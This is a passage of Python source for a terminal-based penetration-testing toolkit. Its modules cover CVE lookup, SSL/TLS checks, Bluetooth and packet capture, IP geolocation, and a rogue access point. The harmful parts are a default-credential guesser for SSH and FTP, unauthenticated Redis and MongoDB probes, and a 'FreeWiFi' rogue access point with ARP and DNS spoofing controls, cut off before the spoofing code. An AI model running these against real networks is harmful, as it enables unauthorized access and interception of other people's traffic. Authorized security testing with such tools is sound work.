            self.query_one("#vuln-status", Static).update("[red]Enter a target[/red]")
            return
        port = self.query_one("#vuln-port", Input).value.strip()
        self.run_cred_check(target, port)

    @on(Button.Pressed, "#btn-vuln-quick")
    def do_quick_scan(self) -> None:
        target = self.query_one("#vuln-target", Input).value.strip()
        if not target:
            self.query_one("#vuln-status", Static).update("[red]Enter a target[/red]")
            return
        self.run_quick_scan(target)

    @on(Button.Pressed, "#btn-vuln-clear")
    def clear_results(self) -> None:
        self.query_one("#vuln-results", RichLog).clear()
        self.query_one("#vuln-status", Static).update("")

    @work(exclusive=True)
    async def run_cve_lookup(self, service_input: str) -> None:
        """Look up CVEs for a service/version string."""
        log = self.query_one("#vuln-results", RichLog)
        status = self.query_one("#vuln-status", Static)

        log.clear()
        status.update("[cyan]Looking up CVEs...[/cyan]")
        log.write(f"[bold cyan]CVE Lookup: {service_input}[/bold cyan]\n")

        # Parse service and version from input like "OpenSSH 7.4" or "Apache/2.4.29"
        parts = re.split(r'[/\s]+', service_input, maxsplit=1)
        if len(parts) == 2:
            service, version = parts
        else:
            service = parts[0]
            version = ""

        log.write(f"[cyan]Service:[/cyan] {service}")
        log.write(f"[cyan]Version:[/cyan] {version or 'Unknown'}\n")

        if not version:
            log.write("[yellow]⚠ No version specified - showing all known CVEs[/yellow]\n")
            # Show all CVEs for this service
            service_lower = service.lower()
            found = False
            for svc_pattern, cves in CVE_DATABASE.items():
                if svc_pattern in service_lower or service_lower in svc_pattern:
                    found = True
                    log.write(f"[bold cyan]Known vulnerabilities for {svc_pattern}:[/bold cyan]")
                    for vuln_version, severity, cve_id, description in cves:
                        sev_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}.get(severity, "white")
                        log.write(f"[{sev_color}][{severity}][/{sev_color}] {cve_id}")
                        log.write(f"  Version ≤ {vuln_version}: {description}")
            if not found:
                log.write(f"[green]No CVEs found for '{service}' in database[/green]")
        else:
            cves = lookup_cves(service, version)
            if cves:
                log.write(f"[bold red]⚠ Found {len(cves)} potential vulnerabilities![/bold red]\n")
                for cve in cves:
                    sev_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}.get(cve['severity'], "white")
                    log.write(f"[{sev_color}]■ [{cve['severity']}] {cve['cve']}[/{sev_color}]")
                    log.write(f"  {cve['description']}")
                    log.write(f"  [dim]Affects versions ≤ {cve['affected_version']}[/dim]\n")
                if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                    play_beep(500, 200)
            else:
                log.write("[green]✓ No known CVEs found for this version[/green]")
                log.write("[dim]Note: Only checks embedded database, not all CVEs[/dim]")

        status.update("[green]CVE lookup complete[/green]")

    @work(exclusive=True)
    async def run_ssl_scan(self, target: str, port: str) -> None:
        """Scan for SSL/TLS vulnerabilities."""
        log = self.query_one("#vuln-results", RichLog)
        status = self.query_one("#vuln-status", Static)

        log.clear()
        status.update("[cyan]Scanning SSL/TLS...[/cyan]")
        log.write(f"[bold cyan]SSL/TLS Vulnerability Scan: {target}:{port}[/bold cyan]\n")

        vulnerabilities = []

        try:
            # Check supported protocols using openssl
            log.write("[cyan]Checking protocol support...[/cyan]")

            protocols = [
                ("ssl2", "SSLv2"),
                ("ssl3", "SSLv3"),
                ("tls1", "TLSv1.0"),
                ("tls1_1", "TLSv1.1"),
                ("tls1_2", "TLSv1.2"),
                ("tls1_3", "TLSv1.3"),
            ]

            for proto_flag, proto_name in protocols:
                proc = await asyncio.create_subprocess_exec(
                    "timeout", "5", "openssl", "s_client",
                    f"-{proto_flag}", "-connect", f"{target}:{port}",
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await proc.communicate(b"Q\n")
                output = stdout.decode() + stderr.decode()

                if "CONNECTED" in output and "error" not in output.lower():
                    if proto_name in SSL_VULNS:
                        severity, desc = SSL_VULNS[proto_name]
                        sev_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "cyan"}.get(severity, "white")
                        log.write(f"[{sev_color}]■ [{severity}] {proto_name}: {desc}[/{sev_color}]")
                        vulnerabilities.append((severity, proto_name))
                    else:
                        log.write(f"[green]✓ {proto_name}: Supported (secure)[/green]")
                else:
                    log.write(f"[dim]✗ {proto_name}: Not supported[/dim]")

            # Check for weak ciphers
            log.write("\n[cyan]Checking cipher suites...[/cyan]")

            weak_cipher_checks = [
                ("RC4", "-cipher RC4"),
                ("DES", "-cipher DES"),
                ("NULL", "-cipher NULL"),
                ("EXPORT", "-cipher EXPORT"),
            ]

            for cipher_name, cipher_flag in weak_cipher_checks:
                proc = await asyncio.create_subprocess_exec(
                    "timeout", "5", "openssl", "s_client",
                    "-connect", f"{target}:{port}",
                    *cipher_flag.split(),
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await proc.communicate(b"Q\n")
                output = stdout.decode() + stderr.decode()

                if "CONNECTED" in output and "Cipher is" in output and "0000" not in output:
                    if cipher_name in SSL_VULNS:
                        severity, desc = SSL_VULNS[cipher_name]
                        sev_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow"}.get(severity, "white")
                        log.write(f"[{sev_color}]■ [{severity}] {cipher_name}: {desc}[/{sev_color}]")
                        vulnerabilities.append((severity, cipher_name))
                else:
                    log.write(f"[green]✓ {cipher_name}: Not enabled[/green]")

            # Check certificate
            log.write("\n[cyan]Checking certificate...[/cyan]")
            proc = await asyncio.create_subprocess_exec(
                "timeout", "10", "openssl", "s_client",
                "-connect", f"{target}:{port}", "-servername", target,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate(b"Q\n")
            output = stdout.decode()

            if "self signed" in output.lower():
                log.write("[yellow]⚠ Self-signed certificate detected[/yellow]")
            if "verify error" in output.lower():
                log.write("[yellow]⚠ Certificate verification error[/yellow]")
            if "certificate has expired" in output.lower():
                log.write("[red]■ [HIGH] Certificate has expired![/red]")
                vulnerabilities.append(("HIGH", "Expired cert"))

            # Summary
            log.write("\n[bold cyan]Summary[/bold cyan]")
            if vulnerabilities:
                critical = sum(1 for s, _ in vulnerabilities if s == "CRITICAL")
                high = sum(1 for s, _ in vulnerabilities if s == "HIGH")
                medium = sum(1 for s, _ in vulnerabilities if s == "MEDIUM")
                low = sum(1 for s, _ in vulnerabilities if s == "LOW")
                log.write(f"[red]Found {len(vulnerabilities)} issues:[/red]")
                if critical:
                    log.write(f"  [red]CRITICAL: {critical}[/red]")
                if high:
                    log.write(f"  [red]HIGH: {high}[/red]")
                if medium:
                    log.write(f"  [yellow]MEDIUM: {medium}[/yellow]")
                if low:
                    log.write(f"  [cyan]LOW: {low}[/cyan]")
                if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                    play_beep(400, 300)
            else:
                log.write("[green]✓ No major SSL/TLS vulnerabilities found[/green]")

            status.update("[green]SSL scan complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]SSL scan failed[/red]")

    @work(exclusive=True)
    async def run_cred_check(self, target: str, port: str) -> None:
        """Check for default/common credentials."""
        log = self.query_one("#vuln-results", RichLog)
        status = self.query_one("#vuln-status", Static)

        log.clear()
        status.update("[cyan]Checking default credentials...[/cyan]")
        log.write(f"[bold cyan]Default Credential Check: {target}[/bold cyan]")
        log.write("[yellow]⚠ For authorized testing only![/yellow]\n")

        # Determine service type from port
        port_services = {
            "21": "ftp", "22": "ssh", "23": "telnet",
            "3306": "mysql", "5432": "postgres",
            "6379": "redis", "27017": "mongodb",
        }

        services_to_check = []
        if port and port in port_services:
            services_to_check = [port_services[port]]
        elif not port:
            # Scan common ports to detect services
            log.write("[cyan]No port specified, detecting services...[/cyan]")
            common_ports = ["21", "22", "23", "3306", "5432", "6379", "27017"]
            for p in common_ports:
                proc = await asyncio.create_subprocess_exec(
                    "timeout", "2", "nc", "-zv", target, p,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                _, stderr = await proc.communicate()
                if proc.returncode == 0 or "succeeded" in stderr.decode().lower() or "open" in stderr.decode().lower():
                    services_to_check.append(port_services[p])
                    log.write(f"[green]✓ Port {p} open ({port_services[p]})[/green]")

        if not services_to_check:
            log.write("[yellow]No supported services detected[/yellow]")
            log.write("[dim]Supported: FTP(21), SSH(22), Telnet(23),[/dim]")
            log.write("[dim]MySQL(3306), Postgres(5432), Redis(6379), MongoDB(27017)[/dim]")
            status.update("[yellow]No services to check[/yellow]")
            return

        found_creds = []

        for service in services_to_check:
            log.write(f"\n[bold cyan]Checking {service.upper()}...[/bold cyan]")
            creds = DEFAULT_CREDS.get(service, [])

            if service == "ssh":
                actual_port = port or "22"
                for user, passwd in creds[:5]:  # Limit attempts
                    log.write(f"[dim]Trying {user}:{passwd or '(blank)'}...[/dim]")
                    # Use sshpass for automated SSH login attempt
                    proc = await asyncio.create_subprocess_exec(
                        "timeout", "5", "sshpass", f"-p{passwd}",
                        "ssh", "-o", "StrictHostKeyChecking=no",
                        "-o", "BatchMode=no",
                        "-o", "ConnectTimeout=3",
                        f"{user}@{target}", "-p", actual_port,
                        "exit",
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    await proc.communicate()
                    if proc.returncode == 0:
                        log.write(f"[red]■ [CRITICAL] Valid: {user}:{passwd or '(blank)'}[/red]")
                        found_creds.append((service, user, passwd))
                        break

            elif service == "ftp":
                actual_port = port or "21"
                for user, passwd in creds:
                    log.write(f"[dim]Trying {user}:{passwd or '(blank)'}...[/dim]")
                    try:
                        proc = await asyncio.create_subprocess_exec(
                            "timeout", "5", "curl", "-s",
                            f"ftp://{user}:{passwd}@{target}:{actual_port}/",
                            "--max-time", "5",
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        stdout, stderr = await proc.communicate()
                        if proc.returncode == 0:
                            log.write(f"[red]■ [CRITICAL] Valid: {user}:{passwd or '(blank)'}[/red]")
                            found_creds.append((service, user, passwd))
                            break
                    except Exception:
                        pass

            elif service == "redis":
                actual_port = port or "6379"
                log.write("[dim]Checking for no-auth access...[/dim]")
                proc = await asyncio.create_subprocess_exec(
                    "timeout", "3", "redis-cli", "-h", target, "-p", actual_port, "PING",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                if b"PONG" in stdout:
                    log.write("[red]■ [CRITICAL] Redis accessible without auth![/red]")
                    found_creds.append((service, "", ""))

            elif service == "mongodb":
                actual_port = port or "27017"
                log.write("[dim]Checking for no-auth access...[/dim]")
                proc = await asyncio.create_subprocess_exec(
                    "timeout", "5", "mongosh", "--host", target, "--port", actual_port,
                    "--eval", "db.runCommand({ping:1})", "--quiet",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                if proc.returncode == 0 and b"ok" in stdout:
                    log.write("[red]■ [CRITICAL] MongoDB accessible without auth![/red]")
                    found_creds.append((service, "", ""))

        # Summary
        log.write("\n[bold cyan]Summary[/bold cyan]")
        if found_creds:
            log.write(f"[red]⚠ Found {len(found_creds)} default/weak credentials![/red]")
            for svc, user, passwd in found_creds:
                log.write(f"  [red]{svc}: {user}:{passwd or '(no password)'}[/red]")
            if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                play_beep(300, 400)
        else:
            log.write("[green]✓ No default credentials found[/green]")

        status.update("[green]Credential check complete[/green]")

    @work(exclusive=True)
    async def run_quick_scan(self, target: str) -> None:
        """Quick vulnerability scan - combines service detection + CVE lookup."""
        log = self.query_one("#vuln-results", RichLog)
        status = self.query_one("#vuln-status", Static)

        log.clear()
        status.update("[cyan]Running quick vulnerability scan...[/cyan]")
        log.write(f"[bold cyan]Quick Vulnerability Scan: {target}[/bold cyan]\n")

        try:
            # Run nmap service detection
            log.write("[cyan]Detecting services with nmap...[/cyan]\n")

            proc = await asyncio.create_subprocess_exec(
                "nmap", "-sV", "--top-ports", "20", "-T4", target,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            services_found = []
            async for line in proc.stdout:
                text = line.decode().rstrip()
                log.write(text)

                # Parse service lines like "22/tcp open ssh OpenSSH 7.4"
                match = re.match(r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)', text)
                if match:
                    port, service, version_info = match.groups()
                    services_found.append((port, service, version_info.strip()))

            await proc.wait()

            if services_found:
                log.write("\n[bold cyan]CVE Analysis[/bold cyan]")
                total_vulns = 0

                for port, service, version_info in services_found:
                    if version_info:
                        cves = lookup_cves(version_info, version_info)
                        if cves:
                            log.write(f"\n[red]Port {port} ({service}):[/red]")
                            for cve in cves[:3]:  # Top 3 per service
                                sev_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}.get(cve['severity'], "white")
                                log.write(f"  [{sev_color}][{cve['severity']}][/{sev_color}] {cve['cve']}")
                                log.write(f"    {cve['description']}")
                            total_vulns += len(cves)

                if total_vulns > 0:
                    log.write(f"\n[red]⚠ Total potential vulnerabilities: {total_vulns}[/red]")
                    if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                        play_beep(500, 200)
                else:
                    log.write("\n[green]✓ No known CVEs found for detected services[/green]")
            else:
                log.write("\n[yellow]No services detected[/yellow]")

            status.update("[green]Quick scan complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Scan failed[/red]")


class BluetoothModule(Container):
    """Bluetooth scanner module."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._scanning = False

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Button("Scan", id="btn-bt-scan", variant="primary"),
                Button("Paired", id="btn-bt-paired"),
                Button("Info", id="btn-bt-info"),
                Button("Clear", id="btn-bt-clear", variant="error"),
                Static("", id="bt-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="bt-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-bt-scan")
    def do_scan(self) -> None:
        if self._scanning:
            self._scanning = False
            self.query_one("#bt-status", Static).update("[yellow]Stopping scan...[/yellow]")
        else:
            self._scanning = True
            self.scan_devices()

    @on(Button.Pressed, "#btn-bt-paired")
    def do_paired(self) -> None:
        self._scanning = False
        self.show_paired()

    @on(Button.Pressed, "#btn-bt-info")
    def do_info(self) -> None:
        self._scanning = False
        self.show_controller()

    @on(Button.Pressed, "#btn-bt-clear")
    def clear_results(self) -> None:
        self._scanning = False
        self.query_one("#bt-results", RichLog).clear()
        self.query_one("#bt-status", Static).update("")

    @work(exclusive=True)
    async def scan_devices(self) -> None:
        log = self.query_one("#bt-results", RichLog)
        status = self.query_one("#bt-status", Static)

        log.clear()
        status.update("[cyan]Scanning for Bluetooth devices (10s)...[/cyan]")
        log.write("[bold cyan]Bluetooth Device Scan[/bold cyan]\n")

        try:
            # Start scan
            await asyncio.create_subprocess_exec(
                "bluetoothctl", "scan", "on",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )

            await asyncio.sleep(10)

            # Stop scan
            await asyncio.create_subprocess_exec(
                "bluetoothctl", "scan", "off",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )

            # Get devices
            proc = await asyncio.create_subprocess_exec(
                "bluetoothctl", "devices",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                devices = stdout.decode().strip().split('\n')
                log.write(f"[cyan]Found {len(devices)} device(s):[/cyan]\n")
                for device in devices:
                    if device.strip():
                        parts = device.split(' ', 2)
                        if len(parts) >= 3:
                            mac = parts[1]
                            name = parts[2] if len(parts) > 2 else "Unknown"
                            vendor = lookup_mac_vendor(mac)
                            log.write(f"[green]{name}[/green]")
                            log.write(f"  MAC: {mac} ({vendor})")
            else:
                log.write("[yellow]No devices found[/yellow]")

            status.update("[green]Scan complete[/green]")
            self._scanning = False

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Scan failed[/red]")
            self._scanning = False

    @work(exclusive=True)
    async def show_paired(self) -> None:
        log = self.query_one("#bt-results", RichLog)
        status = self.query_one("#bt-status", Static)

        log.clear()
        status.update("[cyan]Getting paired devices...[/cyan]")
        log.write("[bold cyan]Paired Bluetooth Devices[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "bluetoothctl", "paired-devices",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                devices = stdout.decode().strip().split('\n')
                for device in devices:
                    if device.strip():
                        parts = device.split(' ', 2)
                        if len(parts) >= 3:
                            mac = parts[1]
                            name = parts[2]

                            # Get connection status
                            proc2 = await asyncio.create_subprocess_exec(
                                "bluetoothctl", "info", mac,
                                stdout=asyncio.subprocess.PIPE,
                            )
                            info_out, _ = await proc2.communicate()
                            connected = "Connected: yes" in info_out.decode()

                            if connected:
                                log.write(f"[green]● {name}[/green] [bold green](connected)[/bold green]")
                            else:
                                log.write(f"[yellow]○ {name}[/yellow]")
                            log.write(f"  MAC: {mac}")
            else:
                log.write("[yellow]No paired devices[/yellow]")

            status.update("[green]Done[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def show_controller(self) -> None:
        log = self.query_one("#bt-results", RichLog)
        status = self.query_one("#bt-status", Static)

        log.clear()
        status.update("[cyan]Getting controller info...[/cyan]")
        log.write("[bold cyan]Bluetooth Controller Info[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "bluetoothctl", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        key = key.strip()
                        value = value.strip()
                        if key == "Powered":
                            color = "green" if value == "yes" else "red"
                            log.write(f"[{color}]{key}: {value}[/{color}]")
                        elif key == "Discoverable" or key == "Pairable":
                            color = "yellow" if value == "yes" else "gray"
                            log.write(f"[{color}]{key}: {value}[/{color}]")
                        else:
                            log.write(f"[cyan]{key}:[/cyan] {value}")

            status.update("[green]Done[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")


class PacketModule(Container):
    """Packet capture module (tcpdump wrapper)."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._capturing = False
        self._proc = None

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="Iface", id="pkt-iface", value="any"),
                Input(placeholder="Filter", id="pkt-filter"),
                Input(placeholder="Count", id="pkt-count", value="50"),
                Button("Capture", id="btn-pkt-start", variant="primary"),
                Button("Stop", id="btn-pkt-stop", variant="error"),
                Button("Conns", id="btn-pkt-conns"),
                Button("Clear", id="btn-pkt-clear"),
                Static("", id="pkt-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="pkt-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-pkt-start")
    def do_start(self) -> None:
        if self._capturing:
            return
        iface = self.query_one("#pkt-iface", Input).value.strip() or "any"
        filter_exp = self.query_one("#pkt-filter", Input).value.strip()
        count = self.query_one("#pkt-count", Input).value.strip() or "50"
        self.start_capture(iface, filter_exp, count)

    @on(Button.Pressed, "#btn-pkt-stop")
    def do_stop(self) -> None:
        self.stop_capture()

    @on(Button.Pressed, "#btn-pkt-conns")
    def do_conns(self) -> None:
        self.show_connections()

    @on(Button.Pressed, "#btn-pkt-clear")
    def clear_results(self) -> None:
        self.stop_capture()
        self.query_one("#pkt-results", RichLog).clear()
        self.query_one("#pkt-status", Static).update("")

    def stop_capture(self) -> None:
        self._capturing = False
        if self._proc:
            try:
                self._proc.terminate()
            except Exception:
                pass
            self._proc = None
        self.query_one("#pkt-status", Static).update("[yellow]Capture stopped[/yellow]")

    @work(exclusive=True)
    async def start_capture(self, iface: str, filter_exp: str, count: str) -> None:
        log = self.query_one("#pkt-results", RichLog)
        status = self.query_one("#pkt-status", Static)

        log.clear()
        self._capturing = True
        status.update(f"[cyan]Capturing on {iface}...[/cyan]")
        log.write(f"[bold cyan]Packet Capture: {iface}[/bold cyan]")
        if filter_exp:
            log.write(f"[cyan]Filter: {filter_exp}[/cyan]")
        log.write("")

        try:
            cmd = ["sudo", "tcpdump", "-i", iface, "-n", "-l"]
            if count and count != "0":
                cmd.extend(["-c", count])
            if filter_exp:
                cmd.append(filter_exp)

            self._proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            async for line in self._proc.stdout:
                if not self._capturing:
                    break
                text = line.decode().rstrip()
                # Color code by protocol
                if ' > ' in text:
                    if 'HTTP' in text or '.80:' in text or ':80 ' in text:
                        log.write(f"[green]{text}[/green]")
                    elif 'HTTPS' in text or '.443:' in text or ':443 ' in text:
                        log.write(f"[cyan]{text}[/cyan]")
                    elif 'DNS' in text or '.53:' in text or ':53 ' in text:
                        log.write(f"[yellow]{text}[/yellow]")
                    elif 'SSH' in text or '.22:' in text or ':22 ' in text:
                        log.write(f"[magenta]{text}[/magenta]")
                    elif 'ICMP' in text:
                        log.write(f"[blue]{text}[/blue]")
                    else:
                        log.write(text)
                else:
                    log.write(f"[gray]{text}[/gray]")

            await self._proc.wait()
            status.update("[green]Capture complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Capture failed[/red]")
        finally:
            self._capturing = False
            self._proc = None

    @work(exclusive=True)
    async def show_connections(self) -> None:
        log = self.query_one("#pkt-results", RichLog)
        status = self.query_one("#pkt-status", Static)

        log.clear()
        status.update("[cyan]Getting active connections...[/cyan]")
        log.write("[bold cyan]Active Network Connections[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "ss", "-tunap",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                lines = stdout.decode().strip().split('\n')
                for i, line in enumerate(lines):
                    if i == 0:
                        log.write(f"[cyan]{line}[/cyan]")
                    elif 'ESTAB' in line:
                        log.write(f"[green]{line}[/green]")
                    elif 'LISTEN' in line:
                        log.write(f"[yellow]{line}[/yellow]")
                    elif 'TIME-WAIT' in line:
                        log.write(f"[gray]{line}[/gray]")
                    else:
                        log.write(line)

            status.update("[green]Done[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")


class GeoModule(Container):
    """IP Geolocation module."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="IP (blank=yours)", id="geo-input"),
                Button("Lookup", id="btn-geo", variant="primary"),
                Button("My IP", id="btn-myip"),
                Button("Clear", id="btn-geo-clear", variant="error"),
                Static("", id="geo-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="geo-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-geo")
    def do_geo(self) -> None:
        ip = self.query_one("#geo-input", Input).value.strip()
        self.lookup_geo(ip)

    @on(Button.Pressed, "#btn-myip")
    def do_myip(self) -> None:
        self.query_one("#geo-input", Input).value = ""
        self.lookup_geo("")

    @on(Button.Pressed, "#btn-geo-clear")
    def clear_results(self) -> None:
        self.query_one("#geo-results", RichLog).clear()
        self.query_one("#geo-status", Static).update("")

    @work(exclusive=True)
    async def lookup_geo(self, ip: str) -> None:
        """Look up IP geolocation."""
        log = self.query_one("#geo-results", RichLog)
        status = self.query_one("#geo-status", Static)

        log.clear()

        if not HAS_REQUESTS:
            log.write("[red]requests library not installed[/red]")
            status.update("[red]Missing dependency[/red]")
            return

        target = ip if ip else "your IP"
        status.update(f"[cyan]Looking up {target}...[/cyan]")

        try:
            # Use ip-api.com (free, no key required)
            url = f"http://ip-api.com/json/{ip}" if ip else "http://ip-api.com/json/"

            loop = asyncio.get_event_loop()
            response = await loop.run_in_executor(
                None,
                lambda: requests.get(url, timeout=10)
            )
            data = response.json()

            if data.get("status") == "success":
                log.write(f"[bold cyan]IP Geolocation[/bold cyan]\n")
                log.write(f"[green]IP Address:[/green]    {data.get('query', 'N/A')}")
                log.write(f"[green]Country:[/green]       {data.get('country', 'N/A')} ({data.get('countryCode', '')})")
                log.write(f"[green]Region:[/green]        {data.get('regionName', 'N/A')} ({data.get('region', '')})")
                log.write(f"[green]City:[/green]          {data.get('city', 'N/A')}")
                log.write(f"[green]ZIP Code:[/green]      {data.get('zip', 'N/A')}")
                log.write(f"[green]Coordinates:[/green]   {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}")
                log.write(f"[green]Timezone:[/green]      {data.get('timezone', 'N/A')}")
                log.write(f"[green]ISP:[/green]           {data.get('isp', 'N/A')}")
                log.write(f"[green]Organization:[/green]  {data.get('org', 'N/A')}")
                log.write(f"[green]AS:[/green]            {data.get('as', 'N/A')}")

                # Check for special IP types
                if data.get('mobile'):
                    log.write(f"[yellow]Mobile Network: Yes[/yellow]")
                if data.get('proxy'):
                    log.write(f"[yellow]Proxy/VPN: Yes[/yellow]")
                if data.get('hosting'):
                    log.write(f"[yellow]Hosting/Datacenter: Yes[/yellow]")

                status.update("[green]Lookup complete[/green]")
            else:
                log.write(f"[red]Lookup failed: {data.get('message', 'Unknown error')}[/red]")
                status.update("[red]Lookup failed[/red]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Lookup failed[/red]")


class RogueAPModule(Container):
    """Rogue AP / MITM attack module for authorized pentesting."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._ap_active = False
        self._arp_spoofing = False
        self._dns_spoofing = False
        self._capture_proc = None

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="SSID", id="ap-ssid", value="FreeWiFi"),
                Input(placeholder="Password (blank=open)", id="ap-password"),
                Input(placeholder="Spoof target IP", id="ap-spoof-target"),
                Input(placeholder="DNS redirect IP", id="ap-dns-redirect"),
                Select([
                    ("wlan0", "wlan0"),
                    ("eth0", "eth0"),
                ], id="ap-iface", value="wlan0"),
                Button("Start AP", id="btn-ap-start", variant="primary"),
                Button("Stop AP", id="btn-ap-stop", variant="error"),
                Button("Clients", id="btn-ap-clients"),
                Button("ARP Spoof", id="btn-arp-spoof"),
                Button("DNS Spoof", id="btn-dns-spoof"),
                Button("Capture", id="btn-ap-capture"),
                Button("Clear", id="btn-ap-clear"),
                Static("", id="ap-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="ap-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-ap-start")
    def start_ap(self) -> None:
        if self._ap_active:
            self.query_one("#ap-status", Static).update("[yellow]AP already running[/yellow]")
            return
        ssid = self.query_one("#ap-ssid", Input).value.strip() or "FreeWiFi"
        password = self.query_one("#ap-password", Input).value.strip()
        iface = self.query_one("#ap-iface", Select).value
        self.run_start_ap(ssid, password, iface)

    @on(Button.Pressed, "#btn-ap-stop")
    def stop_ap(self) -> None:
        self.run_stop_ap()

    @on(Button.Pressed, "#btn-ap-clients")
    def show_clients(self) -> None:
        self.run_show_clients()

    @on(Button.Pressed, "#btn-arp-spoof")
    def toggle_arp_spoof(self) -> None:
        target = self.query_one("#ap-spoof-target", Input).value.strip()
        if not target:
            self.query_one("#ap-status", Static).update("[red]Enter target IP[/red]")
            return
        if self._arp_spoofing:
            self.stop_arp_spoof()
        else:
            self.run_arp_spoof(target)

    @on(Button.Pressed, "#btn-dns-spoof")
    def toggle_dns_spoof(self) -> None:
        redirect_ip = self.query_one("#ap-dns-redirect", Input).value.strip()
        if not redirect_ip:
            self.query_one("#ap-status", Static).update("[red]Enter redirect IP[/red]")
            return
        if self._dns_spoofing:
            self.stop_dns_spoof()
        else:
            self.run_dns_spoof(redirect_ip)

    @on(Button.Pressed, "#btn-ap-capture")
    def start_capture(self) -> None:
        self.run_traffic_capture()

    @on(Button.Pressed, "#btn-ap-clear")
    def clear_results(self) -> None:
        self.stop_arp_spoof()
        self.stop_dns_spoof()
        self.query_one("#ap-results", RichLog).clear()
        self.query_one("#ap-status", Static).update("")

    @work(exclusive=True)
    async def run_start_ap(self, ssid: str, password: str, iface: str) -> None:
        """Start a rogue access point using nmcli."""
        log = self.query_one("#ap-results", RichLog)
        status = self.query_one("#ap-status", Static)

        log.clear()
        log.write("[bold magenta]>>> ROGUE AP MODULE <<<[/bold magenta]")
        log.write("[yellow]For authorized security testing only![/yellow]\n")

        status.update("[cyan]Starting AP...[/cyan]")
        log.write(f"[cyan]> Creating hotspot '{ssid}' on {iface}[/cyan]")

        try:
            # Build nmcli command
            cmd = ["sudo", "nmcli", "device", "wifi", "hotspot",
                   "ifname", iface, "ssid", ssid]
            if password:
                cmd.extend(["password", password])
                log.write(f"[cyan]> Security: WPA2 (password protected)[/cyan]")
            else:
                log.write(f"[yellow]> Security: OPEN (no password)[/yellow]")

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode == 0:
                self._ap_active = True
